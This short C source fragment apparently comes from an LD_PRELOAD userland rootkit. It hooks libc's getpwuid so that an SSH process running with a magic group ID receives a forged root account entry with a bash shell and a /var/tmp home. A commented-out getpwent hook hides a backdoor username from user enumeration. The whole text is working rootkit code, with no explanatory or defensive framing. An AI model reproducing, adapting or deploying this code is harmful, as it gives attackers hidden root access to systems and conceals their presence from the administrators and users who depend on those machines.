/*
struct passwd *getpwent(void){
	hook(CGETPWENT);
	struct passwd *tmp = call(CGETPWENT);
	if(tmp && tmp->pw_name != NULL)
		if(!xstrncmp(tmp->pw_name,BD_UNAME)){
			errno = ESRCH;
			tmp = NULL;
		}
	return tmp;
}
*/

struct passwd *getpwuid(uid_t uid){
	hook(CGETPWUID);
	if(getgid() == MAGIC_GID && uid == 0 && process("ssh")){
		struct passwd *bpw = call(CGETPWUID, uid);
		bpw->pw_uid = 0;
		bpw->pw_gid = MAGIC_GID;
		bpw->pw_dir = "/var/tmp/";
		bpw->pw_shell = "/bin/bash";
		return bpw;
	}
	return call(CGETPWUID, uid);
}
